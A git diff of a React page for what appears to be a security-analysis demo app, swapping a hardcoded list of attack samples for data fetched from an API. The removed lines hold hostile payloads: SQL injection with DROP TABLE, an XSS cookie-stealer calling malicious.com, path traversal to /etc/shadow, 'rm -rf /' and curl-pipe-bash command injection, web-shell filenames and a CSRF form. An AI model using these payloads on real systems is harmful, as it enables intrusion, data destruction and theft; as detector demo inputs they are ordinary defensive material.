@@ -8,33 +8,7 @@ export default function Home() {
   const [thinkingMessage, setThinkingMessage] = useState('');
   const [displayMessage, setDisplayMessage] = useState('');
   const [darkMode, setDarkMode] = useState(false);
-
-  const demoData = [
-    {
-      title: "SQL Injection Example",
-      content: "SELECT * FROM users WHERE username = '$input' AND password = '$pass'; DROP TABLE users; SELECT * FROM sensitive_data WHERE user_id = '1' OR '1'='1'; UPDATE users SET admin='true' WHERE username='$input'"
-    },
-    {
-      title: "XSS Attack Pattern",
-      content: "<script>document.cookie='session='+document.cookie; new Image().src='http://malicious.com/steal?cookie='+document.cookie;</script><img src=x onerror='alert(document.cookie)'><iframe src='javascript:alert(`xss`)'></iframe>"
-    },
-    {
-      title: "Directory Traversal",
-      content: "../../../etc/passwd\n../../../etc/shadow\n../../../var/www/html/config.php\n../../../usr/local/etc/apache2/httpd.conf\n../../../../Windows/system.ini\n..\\..\\..\\Windows\\win.ini"
-    },
-    {
-      title: "Command Injection",
-      content: "ping 192.168.1.1; rm -rf /; cat /etc/passwd; echo 'malicious' > system.txt; $(curl http://malicious.com/script.sh | bash)"
-    },
-    {
-      title: "File Upload Exploit",
-      content: "malware.php.jpg\nshell.aspx.jpeg\nexploit.jsp.png\nbackdoor.php%00.jpg\nwebshell.php%20\nmalicious.php;.jpg"
-    },
-    {
-      title: "CSRF Attack",
-      content: "<form action='http://bank.com/transfer' method='POST'><input type='hidden' name='amount' value='1000'><input type='hidden' name='to' value='attacker'></form><script>document.forms[0].submit()</script>"
-    }
-  ];
+  const [demoData, setDemoData] = useState([]);
 
   useEffect(() => {
     if (thinking && thinkingMessage) {
@@ -53,6 +27,34 @@ export default function Home() {
       return () => clearInterval(timer);
     }
   }, [thinking, thinkingMessage]);
+
+  const fetchDemoData = async () => {
+    setThinking(true);
+    setThinkingMessage('Fetching demo data...');
+    setDisplayMessage('');
+
+    try {
+      const response = await fetch('/api/fetch-demo-data', {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+      });
+
+      if (!response.ok) {
+        throw new Error('Failed to fetch demo data');
+      }
+
+      const { demoData } = await response.json();
+
+      setDemoData(demoData);
+      setThinking(false);
+    } catch (error) {
+      setThinkingMessage('An error occurred. Please try again.');
+      setThinking(false);
+    }
+  };
+
   const handleSubmit = async (e) => {
     e.preventDefault();
     setThinking(true);
@@ -154,7 +156,18 @@ export default function Home() {
           {/* Demo Data Section */}
           <div className="md:col-span-12 lg:col-span-3">
             <div className={`backdrop-blur-xl ${darkMode ? 'bg-black/40' : 'bg-white/40'} rounded-[2rem] shadow-2xl ${darkMode ? 'shadow-green-500/20' : 'shadow-emerald-500/20'} p-4 sm:p-6 border ${darkMode ? 'border-green-500/30' : 'border-emerald-500/30'}`}>
-              <h2 className={`text-lg sm:text-xl font-bold ${darkMode ? 'text-green-400' : 'text-emerald-600'} mb-4`}>Demo Examples</h2>
+              <h2 className={`text-lg sm:text-xl font-bold ${darkMode ? 'text-green-400' : 'text-emerald-600'} mb-4`}>Logs and tests</h2>
+              <button
+                onClick={fetchDemoData}
+                className={`w-full py-4 sm:py-5 px-6 sm:px-8 bg-gradient-to-r ${darkMode ? 'from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700' : 'from-emerald-500 to-green-600 hover:from-emerald-600 hover:to-green-700'} text-white font-bold rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] focus:ring-4 ${darkMode ? 'focus:ring-green-500/30' : 'focus:ring-emerald-500/30'} group relative overflow-hidden`}
+              >
+                <span className="relative z-10 flex items-center justify-center gap-2 sm:gap-3 text-base sm:text-lg">
+                  <svg className="w-5 h-5 sm:w-6 sm:h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                  </svg>
+                  Generate Log Data
+                </span>
+              </button>
               <div className="space-y-4 max-h-[300px] sm:max-h-[400px] lg:max-h-[500px] overflow-y-auto">
                 {demoData.map((demo, index) => (
                   <div 
